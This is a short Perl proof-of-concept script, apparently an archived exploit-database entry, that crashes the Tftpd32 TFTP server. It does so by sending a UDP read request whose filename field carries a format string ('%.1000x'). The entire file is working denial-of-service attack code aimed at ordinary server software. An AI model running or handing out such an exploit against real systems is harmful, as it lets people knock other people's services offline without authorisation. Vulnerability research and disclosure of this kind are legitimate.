#!/usr/bin/perl
# Tftpd32 Format String PoC DoS by Critical Security research http://www.critical.lt
use IO::Socket;
$port = "69";
$host = "127.0.0.1";
$tftpudp = IO::Socket::INET->new(PeerPort => $port,PeerAddr => $host,Proto=> 'udp');
$bzz = "\x00\x01" ;   #GET
$bzz .= "%.1000x\x00";
$bzz .= "\x6F\x63\x74\x65\x74\x00"; #octet
$tftpudp->send($bzz);

# milw0rm.com [2006-01-19]
